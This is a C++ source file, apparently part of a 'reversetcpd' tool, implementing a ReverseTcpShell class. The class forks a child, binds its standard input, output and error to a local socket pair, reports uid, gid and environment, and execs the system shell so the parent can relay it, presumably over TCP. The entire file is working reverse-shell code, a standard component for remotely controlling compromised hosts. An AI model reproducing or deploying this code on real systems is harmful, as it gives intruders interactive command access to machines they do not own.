#include <ReverseTcpShell.h>

#include <cstdlib>
#include <fcntl.h>

#include <sys/wait.h>

#define SHELL_ENV "SHELL="
#define PATH_ENV "PATH="

namespace Task
{

const std::string ReverseTcpShell::SHELL = (std::getenv("SHELL")) ? std::getenv("SHELL") : "";
const std::string ReverseTcpShell::PATH  = (std::getenv("PATH")) ? std::getenv("PATH") : DEFAULT_PATH;

ReverseTcpShell::ReverseTcpShell(asio::io_context &ioContext) :
    m_parentSocket(ioContext),
    m_childSocket(ioContext),
    m_shellPid(-1)
{
    asio::local::connect_pair(m_parentSocket, m_childSocket);
}

ReverseTcpShell::~ReverseTcpShell()
{
    //! Cancel all io operations for the Unix sockets.
    m_parentSocket.cancel();
    m_childSocket.cancel();

    if (m_shellPid != -1)
        kill(m_shellPid, SIGKILL);
}

bool ReverseTcpShell::Start()
{
    const size_t pid = fork(); 
    if (0 == pid)
    {
        //! Child.

        //! Dup2 used to close original standard IO file handles
        //! and redirect them to the child socket.
        dup2(m_childSocket.native_handle(), STDIN_FILENO);
        dup2(m_childSocket.native_handle(), STDOUT_FILENO);
        dup2(m_childSocket.native_handle(), STDERR_FILENO);

        //! Initialize the shell variables.
        std::vector<char> shellEnv;
        std::vector<char> pathEnv;

        std::copy_n(SHELL_ENV, strlen(SHELL_ENV), std::back_inserter(shellEnv));
        std::copy(SHELL.begin(), SHELL.end(), std::back_inserter(shellEnv));
        std::copy_n(PATH_ENV, strlen(PATH_ENV), std::back_inserter(pathEnv));
        std::copy(PATH.begin(), PATH.end(), std::back_inserter(pathEnv));
        char* env[] = { shellEnv.data(), pathEnv.data(), NULL };

        std::vector<char> shellPath;
        std::copy(SHELL.begin(), SHELL.end(), std::back_inserter(shellPath));
        char* argv[] = { shellPath.data(), NULL };

        std::cout << "uid=" << getuid() << " gid=" << getgid() << '\n';
        std::cout << std::string(shellEnv.data(), shellEnv.size()) << '\n';
        std::cout << std::string(pathEnv.data(), pathEnv.size()) << '\n';
        std::cout << std::string(shellPath.data(), shellPath.size()) << '\n';

        chdir("/");

        //! Execve to load the shell process and execute it.
        execve(SHELL.c_str(), argv, env);

        std::cerr << "reversetcpd: Errno=" << errno << " - " << strerror(errno) << '\n';
        exit(errno);
    }
    else if (-1 == pid)
    {
        //! Error during fork in the parent.
        std::cerr << "reversetcpd: Error during fork, errno=" << errno << " - " << strerror(errno);

        m_parentSocket.cancel();
        m_childSocket.cancel();

        return false;
    }
    else
    {
        //! Parent.
        m_shellPid = pid;
    }

    return true;
}

ReverseTcpShell::UnixSocket &ReverseTcpShell::GetParentSocket()
{
    return m_parentSocket;
}

pid_t ReverseTcpShell::GetShellPid() const
{
    return m_shellPid;
}

std::pair<bool, int> ReverseTcpShell::HasShellTerminated() const
{
    int status;
    const pid_t result = waitpid(GetShellPid(), &status, WNOHANG);
    
    const bool hasExited = (GetShellPid() == result);

    return std::make_pair(hasExited, status);
}

} // namespace Task
